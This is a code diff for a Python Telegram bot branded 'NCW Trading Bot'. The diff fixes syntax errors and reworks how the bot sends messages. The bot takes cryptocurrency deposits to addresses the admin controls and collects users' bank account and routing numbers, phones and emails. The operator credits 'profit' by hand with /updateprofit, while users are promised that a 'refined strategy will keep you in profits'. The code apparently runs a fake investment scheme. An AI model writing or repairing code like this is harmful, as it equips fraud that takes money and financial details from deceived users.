@@ -82,8 +82,9 @@ async def start_registration(update: Update, context: ContextTypes.DEFAULT_TYPE)
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text(
-        "Please enter your full name:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Please enter your full name:",
         reply_markup=create_cancel_keyboard()
     )
     return WAITING_NAME
@@ -178,7 +179,12 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     if update.callback_query:
-        await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode='Markdown')
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=menu_text,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
     else:
         await update.message.reply_text(menu_text, reply_markup=reply_markup, parse_mode='Markdown')
     
@@ -191,12 +197,13 @@ async def handle_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     
     keyboard = [
         [InlineKeyboardButton("₿ Crypto", callback_data='deposit_crypto')],
-        [InlineKeyboardButton("❌ Cancel", callback_data='back_to_menu')]
+        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(
-        "How would you like to deposit?",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="How would you like to deposit?",
         reply_markup=reply_markup
     )
     return MAIN_MENU
@@ -209,12 +216,13 @@ async def show_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE
     keyboard = []
     for crypto in crypto_addresses.keys():
         keyboard.append([InlineKeyboardButton(f"{crypto}", callback_data=f'crypto_select_{crypto}')])
-    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='back_to_menu')])
+    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(
-        "Select your preferred cryptocurrency:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Select your preferred cryptocurrency:",
         reply_markup=reply_markup
     )
     return MAIN_MENU
@@ -227,8 +235,9 @@ async def handle_crypto_selection(update: Update, context: ContextTypes.DEFAULT_
     crypto_name = query.data.split('_')[-1]
     context.user_data['selected_crypto'] = crypto_name
     
-    await query.edit_message_text(
-        f"Enter the amount you want to deposit in USD:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=f"Enter the amount you want to deposit in USD:",
         reply_markup=create_cancel_keyboard()
     )
     return DEPOSIT_AMOUNT
@@ -289,8 +298,9 @@ async def payment_made(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text(
-        "Please send a screenshot of your payment as proof:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Please send a screenshot of your payment as proof:",
         reply_markup=create_cancel_keyboard()
     )
     return DEPOSIT_PROOF
@@ -315,12 +325,12 @@ async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 Click 'Approve' to confirm this deposit or use /approve {user_id} {amount:.2f}."""
     
     keyboard = [
-        InlineKeyboardButton("✅ Approve", callback_data=f'confirm_deposit_{user_id}_{amount}')
+        [InlineKeyboardButton("✅ Approve", callback_data=f'confirm_deposit_{user_id}_{amount}')]
     ]
-    reply_markup = InlineKeyboardMarkup([keyboard])
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
-        await message = await context.bot.send_message(
+        message = await context.bot.send_message(
             chat_id=ADMIN_USER_ID,
             text=admin_message,
             reply_markup=reply_markup,
@@ -337,6 +347,11 @@ Click 'Approve' to confirm this deposit or use /approve {user_id} {amount:.2f}."
         
     except Exception as e:
         logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process deposit proof. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
     
     user_info['pending_deposit'] = amount
     
@@ -344,7 +359,6 @@ Click 'Approve' to confirm this deposit or use /approve {user_id} {amount:.2f}."
         "Your deposit is pending admin confirmation. You'll be notified once it's processed.",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
     )
-    
     return MAIN_MENU
 
 async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -353,7 +367,10 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
     await query.answer()
     
     if update.effective_user.id != ADMIN_USER_ID:
-        await query.edit_message_text("❌ Unauthorized access.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Unauthorized access."
+        )
         return MAIN_MENU
     
     try:
@@ -362,7 +379,10 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
         amount = float(amount_str)
         
         if user_id not in user_data:
-            await query.edit_message_text("❌ User not found.")
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="❌ User not found."
+            )
             return MAIN_MENU
         
         user_info = get_user_data(user_id)
@@ -378,7 +398,6 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
         except Exception as e:
             logger.error(f"Failed to notify user {user_id}: {e}")
         
-        # Update admin's notification message
         await query.edit_message_text(
             f"{query.message.text}\n\n✅ **Deposit Approved** for user {user_id}."
         )
@@ -386,7 +405,10 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
         return MAIN_MENU
         
     except ValueError:
-        await query.edit_message_text("❌ Invalid format.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Invalid format."
+        )
         return MAIN_MENU
 
 async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -401,8 +423,9 @@ async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(
-        "How would you like to withdraw?",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="How would you like to withdraw?",
         reply_markup=reply_markup
     )
     return MAIN_MENU
@@ -414,26 +437,28 @@ async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_T
     
     context.user_data['withdrawal_method'] = 'crypto'
     
-    await query.edit_message_text(
-        "Enter the amount you want to withdraw in USD:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Enter the amount you want to withdraw in USD:",
         reply_markup=create_cancel_keyboard()
     )
-    return MAIN_MENU
+    return WITHDRAW_AMOUNT
 
-async def withdraw_bank_amount(update: amount Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Withdraw amount for bank transfer"""
+async def withdraw_bank_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get withdrawal amount for bank transfer"""
     query = update.callback_query
     await query.answer()
     
     context.user_data['withdrawal_method'] = 'bank'
     
-    await query.edit_message_text(
-        "Enter the amount you want to withdraw in USD:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Enter the amount you want to withdraw in USD:",
         reply_markup=create_cancel_keyboard()
     )
-    return MAIN_MENU
+    return WITHDRAW_AMOUNT
 
-async def get_withdraw_amount(update: Amount, context: Update ContextTypes.DEFAULT_TYPE) -> int:
+async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Process withdrawal amount"""
     try:
         amount = float(update.message.text)
@@ -446,7 +471,7 @@ async def get_withdraw_amount(update: Amount, context: Update ContextTypes.DEFAU
         if amount > user_info['balance']:
             await update.message.reply_text(
                 f"Insufficient balance. Your available balance is ${user_info['balance']:.2f}",
-                reply_markup=createcancel_keyboard()
+                reply_markup=create_cancel_keyboard()
             )
             return WITHDRAW_AMOUNT
         
@@ -455,7 +480,7 @@ async def get_withdraw_amount(update: Amount, context: Update ContextTypes.DEFAU
         if context.user_data['withdrawal_method'] == 'crypto':
             await update.message.reply_text(
                 "Please enter your cryptocurrency wallet address:",
-                reply_markup=createcancel_keyboard()
+                reply_markup=create_cancel_keyboard()
             )
             return WITHDRAW_CRYPTO_ADDRESS
         else:
@@ -483,11 +508,11 @@ async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE)
     
     admin_message = f"""💸 **Crypto Withdrawal Request**
 
-    👤 **User:** **User** {user_info['name']} (ID: {user_id})
-    💰 **Amount:** ${amount:.2f}
-    🏦 **Crypto Address:** {address}
-    📞 **Phone:** {user_info['phone']}
-    📧 **Email:** {user_info['email']}
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
 
 Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
     
@@ -499,13 +524,18 @@ Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
         )
     except Exception as e:
         logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
     
     user_info['pending_withdrawal'] = amount
     
     await update.message.reply_text(
         "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])])
-    
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
     return MAIN_MENU
 
 async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -542,10 +572,10 @@ async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE)
     admin_message = f"""💸 **Bank Withdrawal Request**
 
 👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** $amount{:.2f}
+💰 **Amount:** ${amount:.2f}
 🏦 **Bank:** {bank_name}
 🔢 **Account:** {account_number}
-🔢 **Amount:** ${routing_number}
+🔢 **Routing:** {routing_number}
 📱 **Phone:** {user_info['phone']}
 📧 **Email:** {user_info['email']}
 
@@ -558,7 +588,12 @@ Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
             parse_mode='Markdown'
         )
     except Exception as e:
-        logger.error(f"Failed to send admin {notification}: {e}")
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
     
     user_info['pending_withdrawal'] = amount
     
@@ -576,12 +611,13 @@ async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     keyboard = []
     for bot_name in trading_bots.keys():
         keyboard.append([InlineKeyboardButton(f"🤖 {bot_name}", callback_data=f'select_bot_{bot_name}')])
-    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='back_to_menu')])
+    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(
-        "🤖 **Select Trading Bot**\n\nChoose a trading bot to copy their strategies:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="🤖 **Select Trading Bot**\n\nChoose a trading bot to copy their strategies:",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
@@ -592,18 +628,19 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
     query = update.callback_query
     await query.answer()
     
-    bot_name = query.data.replace('select_bot_' '', '')
+    bot_name = query.data.replace('select_bot_', '')
     user_id = update.effective_user.id
     user_info = get_user_data(user_id)
     
     if user_info['active_bot'] == bot_name:
-        await query.edit_message_text(
-            f"You are already using {bot_name}. Please wait while it generates profits.",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"You are already using {bot_name}. Please wait while it generates profits.",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
         )
     else:
         user_info['active_bot'] = bot_name
-        description = trading_bots.get(bot_name)
+        description = trading_bots[bot_name]
         
         message = f"""✅ **{bot_name} Activated!**
 
@@ -611,8 +648,9 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
 Our refined strategy will keep you in profits. Monitor your progress in the main menu."""
         
-        await query.edit_message_text(
-            message,
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=message,
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]]),
             parse_mode='Markdown'
         )
@@ -624,8 +662,9 @@ async def handle_stake(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text(
-        "🎯 Staking is coming soon! Stay tuned for this exciting feature.",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="🎯 Staking is coming soon! Stay tuned for this exciting feature.",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
     )
     return MAIN_MENU
@@ -639,8 +678,9 @@ async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     user_info = get_user_data(user_id)
     
     if not user_info['approved']:
-        await query.edit_message_text(
-            "Please wait for your account to be created. You'll be notified once approved.",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please wait for your account to be created. You'll be notified once approved.",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
         )
     else:
@@ -650,8 +690,9 @@ async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        await query.edit_message_text(
-            "🌐 **Visit Our Website**\n\nClick to access the button below to access your trading account:",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="🌐 **Visit Our Website**\n\nClick the button below to access your trading account:",
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
@@ -684,7 +725,21 @@ async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(menu_text, reply_markup=reply_markup, parse_mode='Markdown')
+    try:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=menu_text,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logger.error(f"Failed to send refresh balance message: {e}")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="⚠️ Failed to refresh balance. Please try again or contact support.",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
     
     return MAIN_MENU
 
@@ -693,15 +748,47 @@ async def cancel_operation(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text(
-        "❌ Operation cancelled. Use /start to begin again."
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="❌ Operation cancelled. Use /start to begin again."
     )
     
     return ConversationHandler.END
 
 async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Return to main menu"""
-    return await show_main_menu(update, context)
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = update.effective_user.id
+    user_info = get_user_data(user_id)
+    
+    menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉
+
+💰 **Available Balance:** ${user_info['balance']:.2f}
+📈 **Deposit:** ${user_info['deposit']:.2f}
+📊 **Profit:** ${user_info['profit']:.2f}
+📉 **Withdrawal:** ${user_info['withdrawal']:.2f}"""
+    
+    keyboard = [
+        [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
+         InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
+        [InlineKeyboardButton("🤖 Copy Trade", callback_data='copy_trade'),
+         InlineKeyboardButton("🎯 Stake", callback_data='stake')],
+        [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
+         InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
+        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=menu_text,
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
+    
+    return MAIN_MENU
 
 async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Get user's Telegram ID"""
@@ -737,14 +824,20 @@ async def handle_admin_action(update: Update, context: ContextTypes.DEFAULT_TYPE
     await query.answer()
     
     if update.effective_user.id != ADMIN_USER_ID:
-        await query.edit_message_text("❌ Unauthorized access.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Unauthorized access."
+        )
         return
     
     action = query.data
     
     if action == 'admin_list_users':
         if not user_data:
-            await query.edit_message_text("📝 No users registered yet.")
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
             return
         
         users_list = """👥 **Registered Users** 👥
@@ -778,45 +871,54 @@ Below is a detailed list of all registered users:\n\n"""
                     parse_mode='Markdown'
                 )
         else:
-            await query.edit_message_text(users_list, parse_mode='Markdown')
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
     
     elif action == 'admin_approve_user':
-        await query.edit_message_text(
-            "Please enter the user ID to approve (use /getid to find IDs):",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter the user ID to approve (use /getid to find IDs):",
             reply_markup=create_cancel_keyboard()
         )
         context.user_data['admin_action'] = 'approve_user'
     
     elif action == 'admin_approve_deposit':
-        await query.edit_message_text(
-            "Please enter: /approve <user_id> <amount>",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter: /approve <user_id> <amount>",
             reply_markup=create_cancel_keyboard()
         )
         context.user_data['admin_action'] = 'approve_deposit'
     
     elif action == 'admin_approve_withdrawal':
-        await query.edit_message_text(
-            "Please enter: /approvewithdrawal <user_id> <amount>",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter: /approvewithdrawal <user_id> <amount>",
             reply_markup=create_cancel_keyboard()
         )
         context.user_data['admin_action'] = 'approve_withdrawal'
     
     elif action == 'admin_update_profit':
-        await query.edit_message_text(
-            "Please enter: /updateprofit <user_id> <amount>",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter: /updateprofit <user_id> <amount>",
             reply_markup=create_cancel_keyboard()
         )
         context.user_data['admin_action'] = 'update_profit'
     
     elif action == 'admin_update_crypto':
-        await query.edit_message_text(
-            "Please enter: /updatecrypto <crypto_name> <address>",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter: /updatecrypto <crypto_name> <address>",
             reply_markup=create_cancel_keyboard()
         )
         context.user_data['admin_action'] = 'update_crypto'
     
     elif action == 'admin_help':
-        help_text = """🦺 **Admin Panel Guide** 🛠
+        help_text = """🛠 **Admin Panel Guide** 🛠
 
 Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
 
@@ -857,7 +959,11 @@ Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and 
 - Use /getid to find a user's ID.
 - Check deposit notifications for pending approvals.
 - All commands are case-sensitive."""
-        await query.edit_message_text(help_text, parse_mode='Markdown')
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
 
 async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Admin command to approve deposits"""
@@ -918,7 +1024,7 @@ async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE)
         user_info = user_data[user_id]
         
         if amount > user_info['balance']:
-            await update.message.reply_text("❌ Insufficient balance.")
+            await update.message.reply_text("❌ Insufficient user balance.")
             return
         
         user_info['balance'] -= amount
@@ -934,7 +1040,7 @@ async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE)
             logger.error(f"Failed to notify user {user_id}: {e}")
         
         await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id}.")
-    
+        
     except (ValueError, IndexError):
         await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
 
@@ -970,11 +1076,11 @@ async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
             logger.error(f"Failed to notify user {user_id}: {e}")
         
         await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id}.")
-    
+        
     except (ValueError, IndexError):
         await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
 
-async def update_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Admin command to update crypto addresses"""
     if update.effective_user.id != ADMIN_USER_ID:
         await update.message.reply_text("❌ Unauthorized access.")
@@ -1002,7 +1108,7 @@ async def update_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Admin command to approve user accounts"""
     if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("ID❌ Unauthorized access.")
+        await update.message.reply_text("❌ Unauthorized access.")
         return
     
     try:
@@ -1023,14 +1129,14 @@ async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         try:
             await context.bot.send_message(
                 chat_id=user_id,
-                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now visit our site and use all trading features."
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now visit our website and use all trading features."
             )
         except Exception as e:
             logger.error(f"Failed to notify user {user_id}: {e}")
         
-        await update.message.reply_text(f"✅ Approved user {user_id} ({user_info['name']}).")
+        await update.message.reply_text(f"✅ Approved account for user {user_id} ({user_info['name']}).")
         
-    except ValueError, (IndexError, IndexError):
+    except (ValueError, IndexError):
         await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
 
 async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1102,7 +1208,7 @@ Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and 
 - Alternatively, use the 'Approve' button in deposit notifications.
 
 💸 **Approve Withdrawal**
-- Process a user's withdrawal.
+- Process a user's withdrawal request.
 - Command: /approvewithdrawal <user_id> <amount>
 - Example: /approvewithdrawal 123456789 500.25
 
@@ -1117,7 +1223,7 @@ Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and 
 - Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
 
 ℹ️ **Help**
-- Review this guide anytime with /adminhelp or time the 'Help' button.
+- Review this guide anytime with /adminhelp or the 'Help' button.
 
 **Tips:**
 - Use /getid to find a user's ID.
@@ -1125,6 +1231,33 @@ Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and 
 - All commands are case-sensitive."""
     
     await update.message.reply_text(help_text, parse_mode='Markdown')
+
+async def send_admin_panel(context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Send admin panel to admin on bot startup"""
+    panel_text = """🛠 **NCW Trading Bot Admin Panel** 🛠
+
+Welcome to the admin control center. Manage users, transactions, and system settings below."""
+    
+    keyboard = [
+        [InlineKeyboardButton("👥 List Users", callback_data='admin_list_users')],
+        [InlineKeyboardButton("✅ Approve User", callback_data='admin_approve_user')],
+        [InlineKeyboardButton("💳 Approve Deposit", callback_data='admin_approve_deposit')],
+        [InlineKeyboardButton("💸 Approve Withdrawal", callback_data='admin_approve_withdrawal')],
+        [InlineKeyboardButton("📈 Update Profit", callback_data='admin_update_profit')],
+        [InlineKeyboardButton("🪙 Update Crypto Address", callback_data='admin_update_crypto')],
+        [InlineKeyboardButton("ℹ️ Help", callback_data='admin_help')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=panel_text,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logger.error(f"Failed to send admin panel on startup: {e}")
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle errors"""
@@ -1136,7 +1269,7 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         )
 
 def main() -> None:
-    """Start the bot"""
+    """Start the bot and send admin panel"""
     if not BOT_TOKEN:
         logger.error("BOT_TOKEN environment variable not set!")
         return
@@ -1146,6 +1279,9 @@ def main() -> None:
         return
     
     application = Application.builder().token(BOT_TOKEN).build()
+    
+    # Send admin panel on startup
+    application.job_queue.run_once(send_admin_panel, 1)
     
     conv_handler = ConversationHandler(
         entry_points=[
